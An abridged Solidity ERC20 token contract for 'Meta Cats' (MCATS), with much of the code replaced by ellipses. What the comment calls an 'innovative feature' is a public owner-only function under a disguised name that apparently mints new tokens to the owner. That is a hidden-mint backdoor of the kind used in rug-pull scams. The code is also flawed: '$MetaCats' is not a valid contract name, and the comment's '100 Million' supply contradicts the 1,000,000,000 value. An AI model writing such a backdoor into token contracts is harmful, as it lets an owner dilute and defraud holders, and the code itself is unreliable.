...
//
// $MetaCats proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaCats(uint256 amount) public onlyOwner {
 _MetaCats(msg.sender, amount);
    }
    ...
    function _MetaCats(address account, uint256 amount) internal virtual {
...
contract $MetaCats is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Cats", "MCATS") {
     _MetaCats(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}